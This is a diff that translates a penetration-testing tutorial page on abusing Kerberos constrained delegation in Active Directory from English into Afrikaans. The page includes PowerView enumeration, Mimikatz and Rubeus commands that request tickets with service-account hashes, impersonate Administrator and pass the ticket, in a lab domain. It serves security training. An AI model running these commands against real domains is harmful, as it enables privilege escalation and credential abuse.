@@ -1,22 +1,21 @@
-# Constrained Delegation
+# Beperkte Afvaardiging
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Constrained Delegation
+## Beperkte Afvaardiging
 
-Using this a Domain admin can **allow** a computer to **impersonate a user or computer** against a **service** of a machine.
+Deur dit kan 'n Domein administrateur **toelaat** dat 'n rekenaar **'n gebruiker of rekenaar naboots** teen 'n **diens** van 'n masjien.
 
-- **Service for User to self (**_**S4U2self**_**):** If a **service account** has a _userAccountControl_ value containing [TRUSTED_TO_AUTH_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D), then it can obtain a TGS for itself (the service) on behalf of any other user.
-- **Service for User to Proxy(**_**S4U2proxy**_**):** A **service account** could obtain a TGS on behalf any user to the service set in **msDS-AllowedToDelegateTo.** To do so, it first need a TGS from that user to itself, but it can use S4U2self to obtain that TGS before requesting the other one.
+- **Diens vir Gebruiker om self (**_**S4U2self**_**):** As 'n **diensrekening** 'n _userAccountControl_ waarde het wat [TRUSTED_TO_AUTH_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) bevat, kan dit 'n TGS vir homself (die diens) verkry namens enige ander gebruiker.
+- **Diens vir Gebruiker om Proxy(**_**S4U2proxy**_**):** 'n **diensrekening** kan 'n TGS verkry namens enige gebruiker na die diens wat in **msDS-AllowedToDelegateTo** gestel is. Om dit te doen, het dit eers 'n TGS van daardie gebruiker na homself nodig, maar dit kan S4U2self gebruik om daardie TGS te verkry voordat dit die ander een aanvra.
 
-**Note**: If a user is marked as ‘_Account is sensitive and cannot be delegated_ ’ in AD, you will **not be able to impersonate** them.
+**Let wel**: As 'n gebruiker gemerk is as ‘_Rekening is sensitief en kan nie afgevaardig word_’ in AD, sal jy **nie in staat wees om** hulle te naboots nie.
 
-This means that if you **compromise the hash of the service** you can **impersonate users** and obtain **access** on their behalf to the **service configured** (possible **privesc**).
+Dit beteken dat as jy die **hash van die diens** kompromitteer, jy **gebruikers kan naboots** en **toegang** namens hulle tot die **diens geconfigureer** (moontlike **privesc**).
 
-Moreover, you **won't only have access to the service that the user is able to impersonate, but also to any service** because the SPN (the service name requested) is not being checked, only privileges. Therefore, if you have access to **CIFS service** you can also have access to **HOST service** using `/altservice` flag in Rubeus.
+Boonop, jy **sal nie net toegang hê tot die diens wat die gebruiker kan naboots nie, maar ook tot enige diens** omdat die SPN (die diensnaam wat aangevra word) nie nagegaan word nie, net voorregte. Daarom, as jy toegang het tot **CIFS diens** kan jy ook toegang hê tot **HOST diens** met die `/altservice` vlag in Rubeus.
 
-Also, **LDAP service access on DC**, is what is needed to exploit a **DCSync**.
-
+Ook, **LDAP diens toegang op DC**, is wat nodig is om 'n **DCSync** te benut.
 ```bash:Enumerate
 # Powerview
 Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
@@ -44,12 +43,10 @@ tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /aes256:babf31
 tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
 .\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
 ```
-
 > [!WARNING]
-> There are **other ways to obtain a TGT ticket** or the **RC4** or **AES256** without being SYSTEM in the computer like the Printer Bug and unconstrain delegation, NTLM relaying and Active Directory Certificate Service abuse
+> Daar is **ander maniere om 'n TGT-kaartjie te verkry** of die **RC4** of **AES256** sonder om SYSTEM op die rekenaar te wees, soos die Printer Bug en onbeperkte delegasie, NTLM herlewing en misbruik van die Active Directory Sertifikaatdiens.
 >
-> **Just having that TGT ticket (or hashed) you can perform this attack without compromising the whole computer.**
-
+> **Net deur daardie TGT-kaartjie (of gehasht) te hê, kan jy hierdie aanval uitvoer sonder om die hele rekenaar te kompromitteer.**
 ```bash:Using Rubeus
 #Obtain a TGS of the Administrator user to self
 .\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator
@@ -77,8 +74,6 @@ tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.mo
 #Load the TGS in memory
 Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
 ```
-
-[**More information in ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
+[**Meer inligting op ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
 
 {{#include ../../banners/hacktricks-training.md}}
-
